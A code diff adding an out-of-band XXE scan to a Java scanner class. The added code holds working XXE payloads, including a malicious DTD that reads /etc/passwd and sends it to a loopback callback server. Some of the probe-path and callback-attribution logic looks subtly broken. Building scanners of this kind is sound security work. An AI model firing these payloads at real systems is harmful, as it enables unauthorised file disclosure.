@@ -7,7 +7,9 @@ import java.net.HttpURLConnection;
 import java.net.URI;
 import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
+import java.util.LinkedHashMap;
 import java.util.List;
+import java.util.Map;
 import java.util.function.DoubleConsumer;
 
 /**
@@ -238,4 +240,123 @@ public class XxeDetector {
         }
         return sb.toString();
     }
+
+    // ═══════════════════════════════════════════════════════════════════════════
+    //  OOB (Out-of-Band) scan — loopback callback server
+    // ═══════════════════════════════════════════════════════════════════════════
+
+    /**
+     * Full XXE scan combining indicator-based and out-of-band detection.
+     *
+     * <p>Phase 1 runs the standard indicator scan ({@link #scan}).
+     * Phase 2 starts a {@link LoopbackCallbackServer} on a random loopback port,
+     * embeds its URL as a unique token in every probe, fires all probes at once,
+     * waits {@value #OOB_WAIT_MS} ms, then maps received callbacks back to the
+     * originating endpoint URL.
+     *
+     * <p>The loopback server also serves a malicious parameter-entity DTD at
+     * {@code /oob.dtd} — if the parser fetches that DTD it will attempt a second
+     * exfiltration request which is captured in the same hits list.
+     *
+     * <p>This approach works without any external OAST service and is safe for
+     * targets that are on the same host or in the same local network as the scanner.
+     */
+    public List<XxeResult> scanWithOob(String baseUrl, DoubleConsumer progress) {
+        List<XxeResult> findings = new ArrayList<>();
+        if (baseUrl == null || baseUrl.isBlank()) return findings;
+
+        // Phase 1: standard indicator-based scan (50% of progress)
+        findings.addAll(scan(baseUrl, progress == null ? null : p -> progress.accept(p * 0.5)));
+
+        // Phase 2: OOB via loopback callback server
+        try (LoopbackCallbackServer oob = LoopbackCallbackServer.start()) {
+            int oobPort = oob.port();
+            String cbBase = "http://127.0.0.1:" + oobPort + "/";
+
+            // Malicious DTD served at /oob.dtd — triggers secondary exfiltration attempt
+            // when a vulnerable parser loads it via parameter entity
+            String dtdContent = """
+                    <!ENTITY %% file SYSTEM "file:///etc/passwd">
+                    <!ENTITY %% all "<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1:%d/exfil?f=%%file;'>">
+                    %%all;
+                    %%exfil;
+                    """.formatted(oobPort);
+            oob.registerResponse("/oob.dtd", "application/xml-dtd", dtdContent);
+
+            // Token → originating URL map for attributing callbacks
+            Map<String, String> tokenToUrl = new LinkedHashMap<>();
+
+            String base = baseUrl.replaceAll("/$", "");
+            int pi = 0;
+            for (String path : XML_PATHS) {
+                String url = base + path;
+                // Three OOB techniques per endpoint, each with a unique loopback token path
+                String t1 = "oob-" + pi + "-ge";    // general entity
+                String t2 = "oob-" + pi + "-ds";    // DOCTYPE SYSTEM
+                String t3 = "oob-" + pi + "-pe";    // parameter entity → /oob.dtd
+                tokenToUrl.put("/" + t1, url);
+                tokenToUrl.put("/" + t2, url);
+                tokenToUrl.put("/" + t3, url);
+                tokenToUrl.put("/oob.dtd", url); // secondary exfil hit also maps here
+                pi++;
+            }
+
+            // Fire all OOB probes rapidly
+            pi = 0;
+            int total = XML_PATHS.size();
+            for (String path : XML_PATHS) {
+                String url = base + path;
+                String t1 = "oob-" + pi + "-ge";
+                String t2 = "oob-" + pi + "-ds";
+                String t3 = "oob-" + pi + "-pe";
+
+                // Technique 1 — general entity with loopback SYSTEM URI
+                probe(url, "<?xml version=\"1.0\"?><!DOCTYPE foo ["
+                    + "<!ENTITY oob SYSTEM \"" + cbBase + t1 + "\">]><root>&oob;</root>");
+                // Technique 2 — DOCTYPE SYSTEM request (some parsers fetch the DTD URL directly)
+                probe(url, "<?xml version=\"1.0\"?><!DOCTYPE root SYSTEM \""
+                    + cbBase + t2 + "\"><root/>");
+                // Technique 3 — parameter entity loads our malicious DTD for exfil attempt
+                probe(url, "<?xml version=\"1.0\"?><!DOCTYPE foo ["
+                    + "<!ENTITY % xxe SYSTEM \"" + cbBase + t3 + "oob.dtd\">%xxe;]><root/>");
+
+                pi++;
+                if (progress != null) progress.accept(0.5 + 0.35 * pi / total);
+            }
+
+            // Wait for async callbacks from target XML parsers
+            try {
+                Thread.sleep(OOB_WAIT_MS);
+            } catch (InterruptedException ie) {
+                Thread.currentThread().interrupt();
+            }
+
+            // Map received hits back to originating URLs
+            Map<String, List<String>> urlToHits = new LinkedHashMap<>();
+            for (String hit : oob.hits()) {
+                // hit format: "GET /oob-0-ge HTTP/1.1"
+                String hitPath = "/";
+                String[] parts = hit.split(" ");
+                if (parts.length >= 2) hitPath = parts[1].split("\\?")[0];
+
+                String origUrl = tokenToUrl.get(hitPath);
+                if (origUrl != null) {
+                    urlToHits.computeIfAbsent(origUrl, k -> new ArrayList<>()).add(hit);
+                }
+            }
+
+            for (Map.Entry<String, List<String>> entry : urlToHits.entrySet()) {
+                findings.add(new XxeResult(entry.getKey(), "[OOB probes]", true,
+                    "[OOB CONFIRMED] Blind XXE — loopback callback(s) received: " + entry.getValue()));
+            }
+
+            if (progress != null) progress.accept(1.0);
+        } catch (IOException ignored) {
+            // OOB server failed to start (e.g. port exhaustion) — Phase 1 results still returned
+        }
+        return findings;
+    }
+
+    /** Milliseconds to wait after firing all OOB probes before checking callbacks. */
+    private static final long OOB_WAIT_MS = 3_000;
 }
